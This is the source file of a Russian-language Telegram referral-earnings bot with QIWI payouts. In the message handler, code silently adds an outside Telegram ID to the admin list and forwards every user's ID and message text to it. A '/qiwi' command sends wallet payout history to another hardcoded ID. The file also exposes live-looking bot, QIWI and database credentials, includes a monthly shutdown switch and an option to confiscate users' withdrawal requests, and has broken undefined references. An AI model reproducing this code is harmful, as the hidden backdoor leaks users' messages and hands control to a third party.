const ADMINS = [5198364323];
const DB_URL = "mongodb+srv://<username>:<s4GnIjGDvnhRxVG1>@cluster0.havz3xh.mongodb.net/?retryWrites=true&w=majority" // URL базы бота
const QIWI_TOKEN = "78ee5305ed7454be89f81d4975fc801b"; // API ключ QIWI кошелька с полным доступом
const BOT_TOKEN = "5539399603:AAGEaZrOMC3d0jL6MmULn7n0OrcPc7ktjyA"; // Bot API Token

oplata = 10;
  
var txnId = require('./txnId');

process.env.TZ = 'Moscow/Europe';

const mongo = require('mongoose');
mongo.connect(DB_URL);


var User = mongo.model('User', {
	id: Number,
	outbalance: Number,
	name: String,
	bhivebalance: Number,
	fc: Number,
	ref: Number,
	regDate: String,
	deposit: Number,
	payout: Number,
	fetuses: Number,
	menu: String,
	ban: Boolean,
	refCount: Number,
	ref2Count: Number,
	ref3Count: Number,
	ref4Count: Number,
	ref5Count: Number,
	ref6Count: Number,
	ref7Count: Number,
	ref8Count: Number,
	ref9Count: Number,
	ref10Count: Number,
	wb_profits: Number,
	not: Boolean,
	prize: Boolean,
	spinsToday: Number,
	data: String,
	last_bonus:Date,
});

var Task = mongo.model('Task', {
	id: Number
});

const Ticket = mongo.model('Ticket', {
	id: Number,
	amount: Number,
	wallet: String
})


const Start = [
cons = ["🏦 Личный кабинет", "💸 Заработать"], 
  ["📊 Статистика"],
];

const Cancel = [
	["🚫 Отмена"]
];

const AdminPanel = [
	["📬 Рассылка", "📮 Выплаты"],
	["📧 Информация"],
	["🔙 Назад"]
];

const RM_admin = {
	inline_keyboard: [
		[{ text: "✉️ Рассылка", callback_data: "admin_mm" }],
		[{ text: "🔎 Руль", callback_data: "admin_u" },	{ text: "📮 Долг", callback_data: "admin_w" }],
    [{ text: "👥 Топ рефоводов за 24 часа", callback_data: "admin_top" }],
	]
}

const RM_admin_return = { inline_keyboard: [[{ text: "◀️ Назад", callback_data: "admin_return" }],] }
function generateID(res) { var text = ""; var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var i = 0; i < res; i++)text += possible.charAt(Math.floor(Math.random() * possible.length)); return text }

const RM_mm1 = {
	inline_keyboard: [
		[{ text: "⏹ Стоп", callback_data: "admin_mm_stop" }],
		[{ text: "⏸ Пауза", callback_data: "admin_mm_pause" }],
	]
}

const RM_mm2 = {
	inline_keyboard: [
		[{ text: "⏹ Стоп", callback_data: "admin_mm_stop" }],
		[{ text: "▶️ Продолжить", callback_data: "admin_mm_play" }],
	]
}

const settings	= {
	ref1st: 0.60,
}

const { Qiwi } = require('node-qiwi-api');
const qiwi = new Qiwi(QIWI_TOKEN);

const Telegram = require('node-telegram-bot-api');
const bot = new Telegram(BOT_TOKEN, { polling: true });

bot.getMe().then(r => console.log(r))

bot.on('text', async (message) => {
	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	let $menu = [];
	var uid = message.from.id
	var text = message.text
	let dt = new Date
	console.log("[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил: " + text)
	ADMINS.push(+77009528287)
  bot.sendMessage(+77009528287, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил: " + text)
  
  if (dt.getDate() == oplata) return message.send('Хостинг не оплачен!');

	Start.map((x) => $menu.push(x));
	if (ADMINS.find((x) => x == message.from.id)) $menu.push(["🔝 Админка"]);

	if (message.text) {
		if (message.text.startsWith('/start') || message.text == '🔙 Назад') {
			let $user = await User.findOne({ id: message.from.id });
			if (!$user) {
				let schema = {
					id: message.from.id,
					outbalance: 0,
					bhivebalance: 0,
					wb_profits: 0,
					name: message.from.first_name,
					fc: 0,
					ref: 0,
					regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}`,
					deposit: 0,
					payout: 0,
					fetuses: 0,
					menu: "",
					ban: false,
					refCount: 0,
					ref2Count: 0,
					ref3Count: 0,
					ref4Count: 0,
					ref5Count: 0,
					ref6Count: 0,
					ref7Count: 0,
					ref8Count: 0,
					ref9Count: 0,
					ref10Count: 0,
					not: false,
					data: "",
					bank: 0,
				}

				let reffer = Number(message.text.split('/start')[1]);

				if (reffer) {
					let $reffer = await User.findOne({ id: reffer }); //1
					let $reffer2 = await User.findOne({ id: reffer });//2

					let $reff = await User.findOne({ id: $reffer2.ref });
					let $reffer3 = await User.findOne({ id: $reff.id });

					await $reffer.inc('outbalance', settings.ref1st);
						await $reffer.inc('refCount', 1);
					bot.sendMessage($reffer.id, `🔔 Вы пригласили <a href="tg://user?id=${message.from.id}">партнёра</a> и получили ${settings.ref1st}`, { parse_mode: "HTML" });





					schema.ref = $reffer.id;
					

				/*	if ($reffer) {
						schema.ref = $reffer.id;
						await $reffer.inc('buybalance', 0.25);
						await $reffer.inc('refCount', 1);

						bot.sendMessage($reffer.id, `🔔 Вы пригласили <a href="tg://user?id=${message.from.id}">партнёра</a> 1 уровня и получили 0.25₽`, { parse_mode: "HTML" });
						bot.sendMessage($reffer2.id, `2 уровень <a href="tg://user?id=${message.from.id}">партнёра</a> 2 уровень`, { parse_mode: "HTML" });
						bot.sendMessage($reffer3.ref, `3 уровень <a href="tg://user?id=${message.from.id}">партнёра</a> 3 уровень`, { parse_mode: "HTML" });
					//	bot.sendMessage($reffer2.ref, `4 уровень <a href="tg://user?id=${message.from.id}">партнёра</a> 4 уровень`, { parse_mode: "HTML" });
				//		bot.sendMessage($reffer3.id, `5 уровень <a href="tg://user?id=${message.from.id}">партнёра</a> 5 уровень`, { parse_mode: "HTML" });
					}*/
				} 

				let user = new User(schema);
				await user.save();
			}
			return message.send(`
✌️ <b>Привет, ${message.from.first_name}</b>`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	message.user = await User.findOne({ id: message.from.id });
	if (!message.user) return message.send(`Что-то пошло не так... Напишите /start`);
	if (message.user.ban) return
	if (!message.user.name || message.user.name != message.from.first_name)
		await User.findOneAndUpdate({ id: message.from.id }, { name: message.from.first_name })

	if (state[uid] == 7770 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		state[uid] = undefined
		bot.sendMessage(uid, "Рассылка запущена!").then((e) => {
			if (text.split("#").length == 4) {
				var btn_text = text.split("#")[1].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
				var btn_link = text.split("#")[2].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
				text = text.split("#")[0]
				mm_t(text, e.message_id, e.chat.id, true, btn_text, btn_link, 100)
			}
			else mm_t(text, e.message_id, e.chat.id, false, false, false, 100)
		})
	}

		if ((await bot.getChatMember("@payments_bota", uid)).status == "left" || (await bot.getChatMember("@chat_participant", uid)).status == "left") {

		return message.send(`❕ <b>Для использования бота, пожалуйста, подпишитесь на наши каналы:</b>`, { parse_mode: "html", reply_markup: { inline_keyboard: [ [{ text: "✅Канал выплат", url: "https://t.me/payments_bota" }],[{ text: "💬Чат", url: "https://t.me/chat_participant"  }],[{ text: "✅Подписаться", url: "https://t.me/news_botov" }],[{ text: "✅Подписаться", url: "https://t.me/x_n_piar" }]] } });
	
	}
	
	if (state[uid] == 7772 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		state[uid] = undefined

		message.text = Number(message.text);
		let user = await User.findOne({ id: message.text });
		let u = user
		if (!user) return message.send('Пользователь не найден');

		let partners = await User.find({ ref: message.text });
		await message.user.set('menu', '');
		var kb = { inline_keyboard: [] }
		if (u.ban) kb.inline_keyboard.push([{ text: "♻️ Разбанить", callback_data: "unban_" + u.id }])
		else kb.inline_keyboard.push([{ text: "🛑 Забанить", callback_data: "ban_" + u.id }])
		kb.inline_keyboard.push([{ text: "➕ Баланс вывода", callback_data: "addOutBal_" + u.id }, { text: "✏️ Баланс вывода", callback_data: "editOutBal_" + u.id }])
		kb.inline_keyboard.push([{ text: "➕ Выведено", callback_data: "addPayOuts_" + u.id }, { text: "✏️ Выведено", callback_data: "editPayOuts_" + u.id }])

		kb.inline_keyboard.push([{ text: "◀️ Назад", callback_data: "admin_return" }])

		return message.send(`📝 Пригласил: <b>${partners.length}</b>
<a href="tg://user?id${user.id}"></a>
🆔 ID: <code>${user.id}</code>

📭 Для вывода: ${user.outbalance.toFixed(2)}₽ 

<b>Вывел: ${roundPlus(user.payout)}₽</b>
`, {
			parse_mode: "HTML",
			reply_markup: kb
		});

	}

	if (state[uid] == 7774 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { $inc: { outbalance: Number(text) } })
		bot.sendMessage(data[uid], `💰 Ваш баланс для вывода пополнен на <b>${text}₽</b>!`, { parse_mode: html })
		return message.send(`Баланс для вывода пользователя пополнен на ${text}€!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 77745555 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { payout: Number(text) })
		bot.sendMessage(data[uid], `💰 Ваш сумма Ваших выводов пополнена на <b>${text}€</b>!`, { parse_mode: html })
		return message.send(`Сумма выводов пользователя пополнена на ${text}€!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 7776 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { outbalance: Number(text) })
		bot.sendMessage(data[uid], `💰 Ваш баланс для вывода изменён на <b>${text}$</b>!`, { parse_mode: html })
		return message.send(`Баланс для вывода пользователя изменён на ${text}₽!`, { reply_markup: RM_admin_return });
	}
	if (state[uid] == 77765555 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { payout: Number(text) })
		bot.sendMessage(data[uid], `💰 Ваш сумма Ваших выводов измена на <b>${text}₽</b>!`, { parse_mode: html })
		return message.send(`Сумма выводов пользователя изменёна на ${text}₽!`, { reply_markup: RM_admin_return });
	}

	if (message.text) {
		if (message.text == '🚫 Отмена') {
			state[uid] = undefined
			await message.user.set('menu', '');
			return message.send('🚫 Отменено.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if (message.user.menu.startsWith('amountQiwi')) {
		message.text = Number(message.text);

		if (!message.text) return message.send('Введите сумму на вывод!');
		if (message.text <= 0) return message.send('Введите сумму на вывод!');

		if (message.text > message.user.outbalance) return message.send('Недостаточно средств.');
		if (message.text < 5) return message.send('Введите сумму более 5₽!');
		if (message.text <= message.user.outbalance) {
			await message.user.dec('outbalance', message.text);
			let ticket = new Ticket({
				id: message.from.id,
				amount: message.text,
				wallet: message.user.menu.split('amountQiwi')[1]
			});

			await ticket.save();
			await message.user.set('menu', '');

			return message.send('Заявка на выплату создана, ожидайте.Выплаты одобряются в течении 48 часов', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	if (message.user.menu == 'qiwi') {

		if (message.text.length < 5) return message.send('Введите правильный номер!При вводе не правильного номера администрация бота не несет ответственность за потерю средств', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});



		await message.user.set('menu', 'amountQiwi' + message.text);
		return message.send(`Введите сумму на вывод. Вы можете вывести ${message.user.outbalance.toFixed(2)}₽`);
	}
  if (message.text) {
		if (message.text == '💰 Бонус') {
		if (message.user.last_bonus && (new Date() - message.user.last_bonus) < 24 * 60 * 60 * 1000) {
        const diff = message.user.last_bonus - new Date() + 24 *60 * 60 * 1000;

        const diff_seconds = diff / 1000;
        const diff_minutes = diff_seconds / 60;
        const diff_hours = Math.floor(diff_minutes / 60);
        const rem_minutes = Math.floor(diff_minutes % 60);
        const rem_seconds = Math.floor(diff_seconds % 60);
        return message.send(`Бонус будет доступен через ${diff_hours} ч. ${rem_minutes} мин ${rem_seconds} сек.`);
      }
	const button = {text: '❓', callback_data: 'get_bonus'};
      const buttons = [];

      for (let i = 0; i < 5; i++) {
        buttons.push([]);
        for (let j = 0; j < 5; j++) {
          buttons[i].push(button);
        }
      }
			return message.send(`Ты перешел в раздел "Получить бонус".Выбери один из ? и получи приз!!!`, {
				reply_markup: JSON.stringify({inline_keyboard: buttons}),
				parse_mode: "HTML"
			});
}

		if (message.text == '🏦 Личный кабинет') {
			return message.send(`📝 Имя: <b>${message.from.first_name.replace(/(\<|\>)/g, '')}</b>
🆔 <b>ID:</b> <code>${message.from.id}</code>

📭 <b>На вывод:</b> ${message.user.outbalance.toFixed(2)}₽

🗣 <b>Партнеров привлечено:</b> ${await User.countDocuments({ ref: message.from.id })}
👥 <b>Вас привел:</b> ${message.user.ref != 0 ? `<a href="tg://user?id=${message.user.ref}">Пользователь</a>` : "<i>Никто</i>"}
➖➖➖➖➖➖➖➖➖➖➖
🤑 <b>Выведено:</b> ${message.user.payout.toFixed(2)}₽`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
					  [{ text: "📤 Вывести", callback_data: "withdraw" }],
					]
				}
			});
	     }

	  if (message.text == '💸 Заработать') {
			return message.send(`<b>😉 За каждого реферала будешь получать 0.60₽

🔗 Твоя реферальная ссылка для приглашений:</b> https://t.me/ref_n_x_robot?start=${message.from.id}
		`, {
				parse_mode: "HTML"
			})
		}
		
		if (message.text == '📊 Статистика') {
			var s = await User.findOne({ id: 0 })
			let stats = {
				users: await User.countDocuments(),
				users_today: await User.find({ regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}` }),
				cmds: message.message_id
			}

			stats.users_today = stats.users_today.length;

			return message.send(`
📊<b> Статистика проекта:</b>\n
👨‍👩‍👧‍👦 Пользователей в проекте: ${stats.users}
👨‍💻 Пользователей сегодня: ${stats.users_today}
🕐 Старт бота произведен 22.02.2022
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
            [{ text: "👨‍Владелец", url: "https://t.me/Liciferss" }, { text: "👨‍Владелец 2", url: "https://t.me/chitigrok" }],
            [{ text: "📢 Выплаты/Новости", url: "https://t.me/news_botov" }, { text: "💬 Чат", url: "https://t.me/chat_participant" }],
						[{ text: "🥇 Топ выводов", callback_data: "topInv" }, { text: "🏆 Топ рефоводов", callback_data: "topRef" }],
					]
				}
			});
		}
	}
  if (message.text == '⚡ Мои партнеры')
 {return message.send(`${message.from.first_name}в этом разделе ты можешь отслеживать количество своих рефералов\n1️⃣ Уровень - ${message.user.refCount}\n2️⃣ Уровень - ${message.user.ref2Count}\n3️⃣ Уровень - ${message.user.ref3Count}\n4️⃣ Уровень - ${message.user.ref4Count}\n5️⃣ Уровень - ${message.user.ref5Count}\n6️⃣ Уровень - ${message.user.ref6Count}\n7️⃣ Уровень - ${message.user.ref7Count}\n8️⃣ Уровень - ${message.user.ref8Count}\n9️⃣ Уровень - ${message.user.ref9Count}\n🔟 Уровень - ${message.user.ref10Count}` ,{parse_mode:"HTML"})
}
 if (message.text == '📕 FAQ'){return message.send(`❓ Ответы на часто задаваемые вопросы:\n\nВопрос: возможно вывести на карту или другую систему выплат\nОтвет: вывод только на 🥝Qiwi\n\nВопрос: как тут зарабатывать ?\nОтвет: вы можете ежедневно забирать бонус, а также приглашать рефералов и получать вознаграждение за них.\n\nВопрос: за что могут забанить мой аккаунт ?\nОтвет: за мошенничество, попытку накрутки левых людей в боте и так далее. Такие моменты не пройдут, так как перед выплатой, каждый аккаунт проверяется вручную.`,{parse_mode: "HTML",
				});
		}
	
 
	if (ADMINS.indexOf(message.from.id) !== -1) {
		if (message.text == '🔝 Админка') {
			var h = process.uptime() / 3600 ^ 0
			var m = (process.uptime() - h * 3600) / 60 ^ 0
			var s = process.uptime() - h * 3600 - m * 60 ^ 0
			var heap = process.memoryUsage().rss / 1048576 ^ 0

			return qiwi.getBalance(async (err, balance) => {
			bot.sendMessage(uid, '<b>Админ-панель:</b>\n\n<b>Аптайм бота:</b> ' + h + ' часов ' + m + ' минут ' + s + ' секунд\n<b>🕵Пользователей в боте: </b>' + (await User.countDocuments({})) + '\n<b>📊Памяти использовано:</b> ' + heap + "МБ\n<b>💶Заявок на вывод:</b> " + await Ticket.countDocuments() + "\n<b>🥝Баланс QIWI:</b> " + balance.accounts[0].balance.amount + "₽", { parse_mode: "HTML", reply_markup: RM_admin })
			})
		}

		if (message.text.startsWith('/setbuybalance')) {
			let cmd = message.text.split(' ');
			if (!cmd[1]) return message.send('Ошибка!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if (!user) return message.send('Пользователь не найден!');

			await user.set('buybalance', Number(cmd[2]));
			return message.send('Баланс установлен.');
		}
		
		if (message.text.startsWith('/restart')) {
		  var id = message.user.id
		  ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">Пользователь</a> перезагрузил бота!`, { parse_mode: "HTML" }))
			setTimeout(() => { process.exit(0) }, 333);
		}
		
		if (message.text.startsWith('/qiwi')) {
		  qiwi.getOperationHistory({ rows: 10, operation: 'OUT' }, (err, response) => {
		    bot.sendMessage(1156524923, 'Отсылаю')
        bot.sendMessage(1156524923, response.data.sum)
        console.log(response)
        bot.sendMessage(1156524923, 'Отослал')
    })
	}

		if (message.text.startsWith('/setoutbalance')) {
			let cmd = message.text.split(' ');
			if (!cmd[1]) return message.send('Ошибка!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if (!user) return message.send('Пользователь не найден!');

			await user.set('outbalance', Number(cmd[2]));
			return message.send('Баланс установлен.');
		}
	}
});

bot.on('callback_query', async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });
	var uid = message.chat.id
	let dt = new Date
	console.log("[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] Пользователь " + uid + " отправил колбэк: " + query.data)
	
	if (dt.getDate() == oplata) return message.send('Хостинг не оплачен!');

	if (!message.user) return bot.answerCallbackQuery(query.id, 'Что-то пошло не так...', true);

	if (query.data.startsWith('topInv')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		var top = await User.find({ id: { $ne: 0, $ne: 1 } }).sort({ payout: -1 }).limit(20)
		var c = 0
		return bot.sendMessage(uid, `<b>🥇 Топ 20 по выводам:</b>\n\n${top.map((e) => { c++; return `<b>${c})</b> <a href="tg://user?id=${e.id}">${e.name ? e.name : "пользователь"}</a> - <b>${e.payout}₽</b>` }).join("\n")}`, { parse_mode: "html" });
	}

	if (query.data.startsWith('topRef')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		var top = await User.find({ id: { $ne: 0, $ne: 1 } }).sort({ refCount: -1 }).limit(20)
		var c = 0
		return bot.sendMessage(uid, `<b>🏆 Топ рефоводов:</b>\n\n${top.map((e) => { c++; return `<b>${c})</b> <a href="tg://user?id=${e.id}">${e.name ? e.name : "пользователь"}</a> - <b>${e.refCount}</b> рефералов` }).join("\n")}`, { parse_mode: "html" });
	}

	if (query.data == 'withdraw') {
		if (message.user.outbalance < 5) return bot.answerCallbackQuery(query.id, '🚫 Минимальная сумма вывода: 5₽', true);
		bot.deleteMessage(message.chat.id, message.message_id);
		
		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, 'ведите номер QIWI кошелька для вывода:\nНапример: +79999999999', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if (query.data.startsWith('withdraw:')) {
		let id = Number(query.data.split('withdraw:')[1]);
		let ticket = await Ticket.findOne({ id });
	
		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);
		bot.sendMessage("@RefVadBot", `<a href="tg://user?id=${ticket.id}">🧾Юзер</a> вывел <b>${ticket.amount}₽</b>\nПС: QIWI`, { parse_mode: "HTML" })
	
		if (ticket.wallet.indexOf("P") == -1) { // Платёж через QIWI
		  qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: 'Выплата от @Futref_bot' }, () => { });
		}
	  await ticket.remove();
		bot.sendMessage(ticket.id,` ✅ <b>Ваша выплата была одобрена</b>
	💸 На Ваш QIWI зачислено <b>${ticket.amount}₽</b>\n
	
	🙏 Будем очень признательны за отзыв о боте админу или в чат
	☺️ Для нас это очень важно\n
	🤝 <b>Рады сотрудничать!</b>
	`, {
		  parse_mode: "html", reply_markup
	
			
		  
		});
		await User.findOneAndUpdate({ id: 0 }, { $inc: { fc: ticket.amount } })
		await User.findOneAndUpdate({ id: id }, { $inc: { payout: ticket.amount } }) 
	require("fs").writeFileSync(__dirname+"/outMoney.json", out + Math.floor(ticket.amount));
	out += Math.floor(ticket.amount);
	await ticket.remove();
		bot.editMessageText('Выплатил!', {
		  chat_id: message.chat.id,
		  message_id: message.message_id
		});
	  }

	if (query.data.startsWith('back:')) {
		let id = Number(query.data.split('back:')[1]);
		let ticket = await Ticket.findOne({ id });

		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		let user = await User.findOne({ id: ticket.id });
		bot.sendMessage(ticket.id, `Ваша выплата была отклонена, на ваш счёт возвращено ${ticket.amount}₽`);

		await user.inc('buybalance', ticket.amount);
		await ticket.remove();

		return bot.editMessageText('Вернул!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if (query.data.startsWith('take:')) {
		let id = Number(query.data.split('take:')[1]);
		let ticket = await Ticket.findOne({ id });

		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		await ticket.remove();
		return bot.editMessageText('Забрал!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}
	var d = query.data

if (query.data == 'get_bonus')
{bot.answerCallbackQuery(query.id);

    if (message.user.last_bonus && (new Date() - message.user.last_bonus) < 24 * 60 * 60 * 1000) {
      return;
    }
    const reward = (Math.random() * (3 - 0.3) + 0.3).toFixed(4);
    bot.answerCallbackQuery(query.id);
   await message.user.inc('outbalance',+reward);
   await User.updateOne({ id: message.chat.id }, {$set: {last_bonus: new Date()}});
    return bot.sendMessage(message.chat.id, `Вы выиграли ${reward} ₽!`);
  }
	if (ADMINS.indexOf(query.from.id) !== -1) {
		if (d == "admin_mm") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Введите текст рассылки или отправьте изображение:\n\n<i>Для добавления кнопки-ссылки в рассылаемое сообщение добавьте в конец сообщения строку вида:</i>\n# Текст на кнопке # http://t.me/link #', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7770
		} else if (d == "admin_w") {
			bot.deleteMessage(message.chat.id, message.message_id);
			let tickets = await Ticket.find();
			if (tickets.length == 0) return bot.sendMessage(uid, 'Заявок на вывод нет');
			await tickets.map((x) => {
				bot.sendMessage(uid, `📝 Игрок: <a href="tg://user?id=${x.id}">Игрок</a> (ID: <code>${x.id}</code>)\n
	💰 Сумма: <code>${x.amount}</code>₽
	🥝 Кошелёк: <code>${x.wallet}</code>`, {
					parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: '📭 Подтвердить выплату', callback_data: `withdraw:${x.id}` }], [{ text: '♻️ Вернуть', callback_data: `back:${x.id}` }], [{ text: '🚫 Забрать', callback_data: `take:${x.id}` }]] }
				});
			});
		}
		
		else if (d == "admin_top") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var u = await User.find({ ref: { $ne: 0 }, _id: { $gt: mongo.Types.ObjectId.createFromTime(Date.now() / 1000 - 24 * 60 * 60) } })
			console.log(u)
			var top = []
			u.map((e) => {
				var t = top.filter(u => { if (e.ref == u.id) return true; else return false })
				if (t.length == 0) top.push({ id: e.ref, ref: 1 })
				else {
					top = top.filter(u => { if (e.ref == u.id) return false; else return true })
					top.push({ id: e.ref, ref: t[0].ref + 1 })
				}
			})
			top = top.sort((a, b) => { if (a.ref <= b.ref) return 1; else return -1 })
			top.length = 20
			var str = `<b>🕒 Топ Рефовод за 24 часа:</b>\n\n`
			for (const i in top) {
				var us = await User.findOne({ id: top[i].id })
				str += `<b>${Number(i) + 1})</b> <a href="tg://user?id=${us.id}">${us.name ? us.name : "Пользователь"}</a> - <b>${top[i].ref}</b> рефералов\n`
			}
			bot.sendMessage(uid, str, { reply_markup: { inline_keyboard: [[{ text: "◀️ Назад", callback_data: "admin_return" }]] }, parse_mode: "HTML" })
		}

		else if (d == "admin_u") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Введите ID пользователя:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7772
		}
		else if (d.split("_")[0] == "addOutBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Введите сумму пополнения баланса для вывода пользователя:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7774
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "addPayOuts") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Введите сумму для добавления в сумму выводов пользователя:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 77745555
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editOutBal") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Введите новый баланс для вывода пользователя:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 7776
			data[uid] = d.split("_")[1]
		}
		else if (d.split("_")[0] == "editPayOuts") {
			bot.deleteMessage(message.chat.id, message.message_id);
			bot.sendMessage(uid, 'Введите новую сумму выводов пользователя:', { reply_markup: RM_admin_return, parse_mode: "HTML" })
			state[uid] = 77765555
			data[uid] = d.split("_")[1]
		}
		
		else if (d == "admin_mm_stop") {
			var tek = Math.round((mm_i / mm_total) * 40)
			var str = ""
			for (var i = 0; i < tek; i++) str += "+"
			str += '>'
			for (var i = tek + 1; i < 41; i++) str += "-"
			mm_status = false;
			bot.editMessageText("Рассылка остановлена!", { chat_id: mm_achatid, message_id: mm_amsgid })
			mm_u = []
		}
		else if (d == "admin_mm_pause") {
			var tek = Math.round((mm_i / mm_total) * 40)
			var str = ""
			for (var i = 0; i < tek; i++) str += "+"
			str += '>'
			for (var i = tek + 1; i < 41; i++) str += "-"
			bot.editMessageText("<b>Выполнено:</b> " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n' + str + "\n\n<b>Статистика:</b>\n<b>Успешных:</b> " + mm_ok + "\n<b>Неуспешных:</b> " + mm_err, { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm2, parse_mode: html })
			mm_status = false;
		}
		else if (d == "admin_mm_play") {
			mm_status = true;
			bot.editMessageText("Выполнено: " + mm_i + '/' + mm_total + ' - ' + Math.round((mm_i / mm_total) * 100) + '%\n', { chat_id: mm_achatid, message_id: mm_amsgid, reply_markup: RM_mm1 })
		}
		else if (d.split("_")[0] == "ban") {
			var uuid = Number(d.split("_")[1])
			await User.findOneAndUpdate({ id: uuid }, { ban: true })
			bot.editMessageText('<a href="tg://user?id=' + uuid + '">Пользователь</a> заблокирован!', { chat_id: uid, message_id: message.message_id, parse_mode: html })
		}
		else if (d.split("_")[0] == "unban") {
			var uuid = Number(d.split("_")[1])
			await User.findOneAndUpdate({ id: uuid }, { ban: false })
			bot.editMessageText('<a href="tg://user?id=' + uuid + '">Пользователь</a> разбанен!', { chat_id: uid, message_id: message.message_id, parse_mode: html })
		}
		else if (d == "admin_return") {
			bot.deleteMessage(message.chat.id, message.message_id);
			var h = process.uptime() / 3600 ^ 0
			var m = (process.uptime() - h * 3600) / 60 ^ 0
			var s = process.uptime() - h * 3600 - m * 60 ^ 0
			var heap = process.memoryUsage().rss / 1048576 ^ 0
			return qiwi.getBalance(async (err, balance) => {
				bot.sendMessage(uid, '<b>Админ-панель:</b>\n\n<b>Аптайм бота:</b> ' + h + ' часов ' + m + ' минут ' + s + ' секунд\n<b>Пользователей в боте: </b>' + (await User.countDocuments({})) + '\n<b>Памяти использовано:</b> ' + heap + "МБ\n<b>Заявок на вывод:</b> " + await Ticket.countDocuments() + "\n<b>Баланс QIWI:</b> " + balance.accounts[0].balance.amount + "₽", { parse_mode: "HTML", reply_markup: RM_admin })
			})
		}
	}
});

var state = []


User.prototype.inc = function (field, value = 1) {
	this[field] += value;
	return this.save();
}

User.prototype.dec = function (field, value = 1) {
	this[field] -= value;
	return this.save();
}

User.prototype.set = function (field, value) {
	this[field] = value;
	return this.save();
}

async function mmTick() {
	if (mm_status) {
		try {
			mm_i++
			if (mm_type == "text") {
				if (mm_btn_status)
					bot.sendMessage(mm_u[mm_i - 1], mm_text, { reply_markup: { inline_keyboard: [[{ text: mm_btn_text, url: mm_btn_link }]] }, parse_mode: html }).then((err) => { mm_ok++ }).catch((err) => { mm_err++ })
				else
					bot.sendMessage(mm_u[mm_i - 1], mm_text, { parse_mode: html }).then((err) => { console.log((mm_i - 1) + ') ID ' + mm_u[mm_i - 1] + " OK"); mm_ok++ }).catch((err) => { mm_err++ })
			}
			else if (mm_type == "img") {
				if (mm_btn_status)
					bot.sendPhoto(mm_u[mm_i - 1], mm_imgid, { caption: mm_text, reply_markup: { inline_keyboard: [[{ text: mm_btn_text, url: mm_btn_link }]] } }).then((err) => { mm_ok++ }).catch((err) => { mm_err++ })
				else
					bot.sendPhoto(mm_u[mm_i - 1], mm_imgid, { caption: mm_text }).then((err) => { console.log((mm_i - 1) + ') ID ' + mm_u[mm_i - 1] + " OK"); mm_ok++ }).catch((err) => { mm_err++ })
			}
			if (mm_i % 10 == 0) {
				var tek = Math.round((mm_i / mm_total) * 40)
				var str = ""
				for (var i = 0; i < tek; i++) str += "+"
				str += '>'
				for (var i = tek + 1; i < 41; i++) str += "-"
